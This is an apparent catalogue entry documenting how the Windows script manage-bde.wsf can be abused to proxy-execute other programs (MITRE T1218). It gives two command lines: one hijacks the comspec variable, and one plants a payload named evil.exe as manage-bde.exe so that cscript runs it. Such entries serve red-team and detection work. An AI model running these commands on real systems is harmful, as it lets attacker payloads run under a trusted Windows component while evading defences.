## Manage-bde.wsf
```

set comspec=c:\windows\system32\calc.exe & cscript c:\windows\system32\manage-bde.wsf
Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.

copy c:\users\person\evil.exe c:\users\public\manage-bde.exe & cd c:\users\public\ & cscript.exe c:\windows\system32\manage-bde.wsf
Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.
```
* Windows binary: True   
* Bypasses Default AppLocker Rules: False   
* Mitre: [T1218](https://attack.mitre.org/wiki/Technique/T1218)   
   
* Links:   
  * https://gist.github.com/bohops/735edb7494fe1bd1010d67823842b712
  * https://twitter.com/bohops/status/980659399495741441
   
* File path:   
  * 
   
* Acknowledgement:   
  * Name: Jimmy
    * Twitter: [@bohops](https://twitter.com/@bohops)
    * Blog: https://bohops.com/
  * Name: Daniel Bohannon
    * Twitter: [@danielbohannon](https://twitter.com/@danielbohannon)
    * Blog: http://www.danielbohannon.com/
   
OS:  
